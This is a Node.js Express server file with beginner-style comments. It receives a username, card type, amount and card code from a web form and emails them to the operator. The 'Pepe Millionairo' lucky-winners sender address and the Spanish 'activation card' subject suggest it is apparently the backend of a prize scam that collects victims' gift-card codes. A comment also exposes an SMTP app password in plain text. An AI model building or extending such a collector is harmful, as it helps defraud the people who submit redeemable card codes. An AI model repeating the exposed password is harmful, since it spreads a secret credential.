// 1. Load Environment Variables
// This line MUST be at the very top
require('dotenv').config();

// 2. Import necessary packages
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

// 3. Initialize the app
const app = express();
const PORT = process.env.PORT || 4000; // Use port from .env or default to 4000

// 4. Setup Middleware
app.use(cors()); // Allows your frontend to talk to this backend
app.use(express.json()); // Allows the server to read JSON data from the fetch request

// 5. Configure Nodemailer Transporter
// This is where your .env file is used!
const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    secure: true, // true for port 465, false for other ports
    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS, // This is your 'ifrqodgterouuayq' app password
    },
});

// 6. Create the API Endpoint
// This is the URL your frontend's `sendCardDetails` function will call
app.post('/send-card-details', (req, res) => {
    console.log('Received card details:', req.body);

    // Get the card details from the request body
    const { username, cardType, cardAmount, cardCode } = req.body;

    // Create the email content
    const mailOptions = {
        from: process.env.FROM_EMAIL, // 'Pepe Millionairo <ganadoresafortunados@gmail.com>'
        to: process.env.SMTP_USER,     // Send the email TO YOURSELF
        subject: `¡Nueva Tarjeta de Activación Recibida! - ${username}`,
        html: `
            <h1>¡Nueva Tarjeta de Activación!</h1>
            <p>Un usuario acaba de enviar los detalles de una tarjeta.</p>
            <ul>
                <li><strong>Usuario:</strong> ${username}</li>
                <li><strong>Tipo de Tarjeta:</strong> ${cardType}</li>
                <li><strong>Monto:</strong> ${cardAmount}</li>
                <li><strong>Código:</strong> ${cardCode}</li>
            </ul>
        `,
    };

    // 7. Send the email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            return res.status(500).json({ success: false, message: 'Error al enviar el correo.' });
        }
        
        console.log('Email sent:', info.response);
        // Send a success response back to the frontend
        res.status(200).json({ success: true, message: 'Email sent successfully.' });
    });
});

// 8. Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
